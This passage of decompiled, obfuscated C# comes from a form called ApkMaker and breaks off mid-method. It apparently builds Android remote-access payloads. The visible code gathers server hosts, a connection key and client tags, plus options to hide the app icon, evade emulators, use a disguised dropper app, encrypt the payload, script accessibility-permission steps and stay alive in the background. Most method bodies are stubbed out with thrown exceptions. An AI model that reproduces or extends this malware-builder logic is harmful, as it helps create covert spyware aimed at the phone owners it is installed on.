	[field: AccessedThroughProperty("DrakeUISymbolLabel12")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtO
	{
		[CompilerGenerated]
		get
		{
			return _txtO;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtO_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtO;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtO = value;
			drakeUITextBox = _txtO;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel44")]
	internal virtual Panel Panel44
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel11")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtOU
	{
		[CompilerGenerated]
		get
		{
			return _txtOU;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtOU_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtOU;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtOU = value;
			drakeUITextBox = _txtOU;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel43")]
	internal virtual Panel Panel43
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel7")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtCN
	{
		[CompilerGenerated]
		get
		{
			return _txtCN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtCN_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtCN;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtCN = value;
			drakeUITextBox = _txtCN;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel42")]
	internal virtual Panel Panel42
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel6")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtPassword
	{
		[CompilerGenerated]
		get
		{
			return _txtPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtPassword_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtPassword;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtPassword = value;
			drakeUITextBox = _txtPassword;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel41")]
	internal virtual Panel Panel41
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel5")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtAliasName
	{
		[CompilerGenerated]
		get
		{
			return _txtAliasName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtAliasName_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtAliasName;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtAliasName = value;
			drakeUITextBox = _txtAliasName;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon rankeybtn
	{
		[CompilerGenerated]
		get
		{
			return _rankeybtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon16_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _rankeybtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_rankeybtn = value;
			drakeUIButtonIcon = _rankeybtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel49")]
	internal virtual Panel Panel49
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel50")]
	internal virtual Panel Panel50
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label15")]
	internal virtual Label Label15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkcustmsign
	{
		[CompilerGenerated]
		get
		{
			return _checkcustmsign;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkcustmsign_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkcustmsign;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkcustmsign = value;
			drakeUIOSSwitch = _checkcustmsign;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panelsign")]
	internal virtual Panel panelsign
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker Keysloader
	{
		[CompilerGenerated]
		get
		{
			return _Keysloader;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Keysloader_DoWork;
			BackgroundWorker backgroundWorker = _Keysloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_Keysloader = value;
			backgroundWorker = _Keysloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public virtual DataGridView DGVKEYS
	{
		[CompilerGenerated]
		get
		{
			return _DGVKEYS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVKEYS_CellClick;
			DataGridView dataGridView = _DGVKEYS;
			if (dataGridView != null)
			{
				dataGridView.CellClick -= value2;
			}
			_DGVKEYS = value;
			dataGridView = _DGVKEYS;
			if (dataGridView != null)
			{
				dataGridView.CellClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel51")]
	internal virtual Panel Panel51
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label16")]
	internal virtual Label Label16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn2")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn3")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cutryclmn")]
	internal virtual DataGridViewTextBoxColumn cutryclmn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("datclmn")]
	internal virtual DataGridViewTextBoxColumn datclmn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxkeys")]
	internal virtual ContextMenuStrip ctxkeys
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem1 = value;
			toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel52")]
	internal virtual Panel Panel52
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboBoxCountry")]
	internal virtual DrakeUIComboBox ComboBoxCountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel16")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checknotykill")]
	internal virtual DrakeUICheckBox checknotykill
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		throw new System.AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void translattabs(string lngshort)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void translateme()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void OnFormClosed(FormClosedEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public ApkMaker(string nk, HttpClient htpcli, string ip, string conkey, HttpClient dhtpcli)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void nextbtn_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void LoadDGVState()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_1153_ApkMaker_Load))]
	[DebuggerStepThrough]
	private void ApkMaker_Load(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void backbtn_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void UpdateButtonStates()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_1157_loadstorework_DoWork))]
	[DebuggerStepThrough]
	private void loadstorework_DoWork(object sender, DoWorkEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ApkMaker_FormClosing(object sender, FormClosingEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkremember_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void iconsloader_DoWork(object sender, DoWorkEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void addicon_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void listicons_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void SetRowState(int rowIndex, bool isAdd)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVPRIMS_CellValueChanged(object sender, DataGridViewCellEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVPRIMS_CurrentCellDirtyStateChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Control_MouseHover(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Control_MouseLeave(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void langtext_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void updateinputlng()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void addnum_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVSTORBLD_SelectionChanged(object sender, DataGridViewCellEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(VB_0024StateMachine_1175_builderworker_DoWork))]
	[DebuggerStepThrough]
	private void builderworker_DoWork(object sender, DoWorkEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	private void startbuilder()
	{
		try
		{
			_Closure_0024__1176_002D0 arg = default(_Closure_0024__1176_002D0);
			_Closure_0024__1176_002D0 CS_0024_003C_003E8__locals19 = new _Closure_0024__1176_002D0(arg);
			CS_0024_003C_003E8__locals19._0024VB_0024Me = this;
			string text = appname.Text;
			string text2 = appver.Text.Replace(EXGuarder._3F496707, EXGuarder._5E670639);
			string text3 = applink.Text;
			string text4 = connectionkey.Text;
			if (checkdexp.Checked && checkprotect.Checked && MyMsg.Show(BTConst.warningTitlestr, BTConst.warngbothpstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._5E670639) != DialogResult.OK)
			{
				return;
			}
			if (ListTags.Items.Count == 0)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.emptytagstr);
				}));
				return;
			}
			string lastSelectedTag = LastSelectedTag;
			if (codes.StrisEmpty(lastSelectedTag))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.clitagreqstr);
				}));
				return;
			}
			if (codes.StrisEmpty(text4))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.conkeywrngstr);
				}));
				return;
			}
			if (codes.StrisEmpty(text3))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.apurlfstr);
				}));
				return;
			}
			string text5 = CLiname.Text;
			if (codes.StrisEmpty(text5))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.clinamfstr);
				}));
				return;
			}
			if (checkcustmsign.Active && (!checkcustmsign.Active || DGVKEYS.Rows.Count <= 0 || DGVKEYS.SelectedRows.Count <= 0))
			{
				if (codes.StrisEmpty(txtAliasName.Text))
				{
					BTAlerter.infos(EXGuarder._74513402);
					return;
				}
				if (codes.StrisEmpty(txtPassword.Text))
				{
					BTAlerter.infos(EXGuarder._6E687258);
					return;
				}
				if (codes.StrisEmpty(txtCN.Text))
				{
					BTAlerter.infos(EXGuarder._2C502023);
					return;
				}
			}
			string text6 = EXGuarder._5E670639;
			foreach (object item in listhosts.Items)
			{
				string text7 = Conversions.ToString(item);
				text6 = text6 + text7 + EXGuarder._4F194D21;
			}
			if (codes.StrisEmpty(text6) || listhosts.Items.Count == 0)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.clihstfstr + "\r\n" + BTConst.orsrvripstr);
				}));
				return;
			}
			string text8 = appids.Text;
			if (codes.StrisEmpty(text8))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.apidfstr);
				}));
				return;
			}
			string _5D696B0A = titletext.Text;
			if (codes.StrisEmpty(_5D696B0A))
			{
				_5D696B0A = EXGuarder._5D696B0A;
			}
			string _5D696B0A2 = msgtext.Text;
			if (codes.StrisEmpty(_5D696B0A2))
			{
				_5D696B0A2 = EXGuarder._5D696B0A;
			}
			string value = (checknosleep.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string _5B5A6C2C = EXGuarder._5B5A6C2C;
			bool flag = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[0].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag2 = Conversions.ToBoolean(flag && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[0].Cells[3].Value, true, TextCompare: false)));
			string text9 = ((!flag) ? EXGuarder._39471027 : (flag2 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag3 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[2].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag4 = Conversions.ToBoolean(flag3 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[2].Cells[3].Value, true, TextCompare: false)));
			string text10 = ((!flag3) ? EXGuarder._39471027 : (flag4 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag5 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[5].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag6 = Conversions.ToBoolean(flag5 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[5].Cells[3].Value, true, TextCompare: false)));
			string text11 = ((!flag5) ? EXGuarder._39471027 : (flag6 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag7 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[1].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag8 = Conversions.ToBoolean(flag7 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[1].Cells[3].Value, true, TextCompare: false)));
			string text12 = ((!flag7) ? EXGuarder._39471027 : (flag8 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag9 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[3].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag10 = Conversions.ToBoolean(flag9 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[3].Cells[3].Value, true, TextCompare: false)));
			string text13 = ((!flag9) ? EXGuarder._39471027 : (flag10 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag11 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[4].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag12 = Conversions.ToBoolean(flag11 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[4].Cells[3].Value, true, TextCompare: false)));
			string text14 = ((!flag11) ? EXGuarder._39471027 : (flag12 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag13 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[6].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag14 = Conversions.ToBoolean(flag13 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[6].Cells[3].Value, true, TextCompare: false)));
			string text15 = ((!flag13) ? EXGuarder._39471027 : (flag14 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag15 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[7].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag16 = Conversions.ToBoolean(flag15 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[7].Cells[3].Value, true, TextCompare: false)));
			string text16 = ((!flag15) ? EXGuarder._39471027 : (flag16 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag17 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[8].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag18 = Conversions.ToBoolean(flag17 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[8].Cells[3].Value, true, TextCompare: false)));
			string text17 = ((!flag17) ? EXGuarder._39471027 : (flag18 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag19 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[9].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag20 = Conversions.ToBoolean(flag19 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[9].Cells[3].Value, true, TextCompare: false)));
			string text18 = ((!flag19) ? EXGuarder._39471027 : (flag20 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag21 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[10].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag22 = Conversions.ToBoolean(flag21 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[10].Cells[3].Value, true, TextCompare: false)));
			string text19 = ((!flag21) ? EXGuarder._39471027 : (flag22 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag23 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[11].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag24 = Conversions.ToBoolean(flag23 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[11].Cells[3].Value, true, TextCompare: false)));
			string text20 = ((!flag23) ? EXGuarder._39471027 : (flag24 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag25 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[12].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag26 = Conversions.ToBoolean(flag25 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[12].Cells[3].Value, true, TextCompare: false)));
			string text21 = ((!flag25) ? EXGuarder._39471027 : (flag26 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag27 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[13].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag28 = Conversions.ToBoolean(flag27 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[13].Cells[3].Value, true, TextCompare: false)));
			string text22 = ((!flag27) ? EXGuarder._39471027 : (flag28 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag29 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[14].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag30 = Conversions.ToBoolean(flag29 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[14].Cells[3].Value, true, TextCompare: false)));
			string text23 = ((!flag29) ? EXGuarder._39471027 : (flag30 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			bool flag31 = (Operators.ConditionalCompareObjectEqual(DGVPRIMB.Rows[15].Cells[2].Value, EXGuarder._6A15235B, TextCompare: false) ? true : false);
			bool flag32 = Conversions.ToBoolean(flag31 && Conversions.ToBoolean(Operators.CompareObjectEqual(DGVPRIMB.Rows[15].Cells[3].Value, true, TextCompare: false)));
			string text24 = ((!flag31) ? EXGuarder._39471027 : (flag32 ? EXGuarder._5E1C3622 : EXGuarder._0B2A0B24));
			string text25 = (checkhidprim.Checked ? EXGuarder._5E1C3622 : EXGuarder._39471027);
			string text26 = (checkdisstore.Checked ? EXGuarder._5E1C3622 : EXGuarder._39471027) + EXGuarder._33266042 + (checkreplcply.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B) + EXGuarder._33266042 + (checkNoservice.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string text27 = (checkprotect.Checked ? EXGuarder._5E1C3622 : EXGuarder._39471027);
			string text28 = (checkpump.Checked ? EXGuarder._5E1C3622 : EXGuarder._39471027);
			string value2 = string.Join(_5B5A6C2C, text9, text10, text11, text12, text13, text14, text15, text16, text17, text18, text19, text20, text21, text22, text25, text26, text23, text27, text28, text24);
			string value3 = (checknoemu.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			int selectedIndex = langtext.SelectedIndex;
			string text29 = EXGuarder._5E670639;
			switch (selectedIndex)
			{
			case 0:
				text29 = EXGuarder._080F0E16;
				break;
			case 1:
				text29 = EXGuarder._6860410E;
				break;
			case 2:
				text29 = EXGuarder._6B155A65;
				break;
			case 3:
				text29 = EXGuarder._26471E66;
				break;
			case 4:
				text29 = EXGuarder._24256E58;
				break;
			case 5:
				text29 = EXGuarder._121A5B50;
				break;
			case 6:
				text29 = EXGuarder._58696B65;
				break;
			default:
				text29 = EXGuarder._5E670639;
				break;
			case -1:
				break;
			}
			string text30 = EXGuarder._5744093F;
			string value4 = EXGuarder._212A3E0B;
			string value5 = EXGuarder._212A3E0B;
			string value6 = EXGuarder._212A3E0B;
			string _212A3E0B = EXGuarder._212A3E0B;
			string text31 = (checkaccsspage.Active ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string[] steps = ((stepslist.Items.Count != 0) ? stepslist.Items.Cast<string>().ToArray() : Array.Empty<string>());
			string text32 = codes.ToBase64(codes.jsstepsmaker(steps));
			string value7 = text31 + EXGuarder._33266042 + text32;
			string _55175E1F = Acctitletext.Text;
			string _5D = Accmsgtext.Text;
			string _2A6F = Accbtntext.Text;
			string text33 = EXGuarder._5E670639;
			string value8 = text;
			string value9 = text2;
			string value10 = text8;
			string value11 = Conversions.ToString(appicoimg.Tag);
			string value12 = EXGuarder._5C0C081D;
			if (Operators.CompareString(combodroptype.Text, EXGuarder._692B2A45, TextCompare: false) == 0)
			{
				value12 = EXGuarder._59127914;
			}
			string value13 = (codes.StrisEmpty(droptitle.Text) ? EXGuarder._3C267460 : droptitle.Text);
			string value14 = (codes.StrisEmpty(dropmsg.Text) ? EXGuarder._3C267460 : dropmsg.Text);
			string value15 = (encryptmain.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			if (flag)
			{
				if (codes.StrisEmpty(text29))
				{
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						BTAlerter.infos(BTConst.aplungfstr);
					}));
					return;
				}
				text30 = (comboacctype.Text.StartsWith(EXGuarder._3D2A1E2E) ? EXGuarder._3F1F145B : EXGuarder._5744093F);
				if (Operators.CompareString(text30, EXGuarder._3F1F145B, TextCompare: false) == 0)
				{
					value8 = dropname.Text;
					value9 = dropver.Text;
					value10 = dropid.Text;
					if (dropimg.Tag == null)
					{
						Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
						{
							BTAlerter.infos(BTConst.slcticodropstr);
						}));
						return;
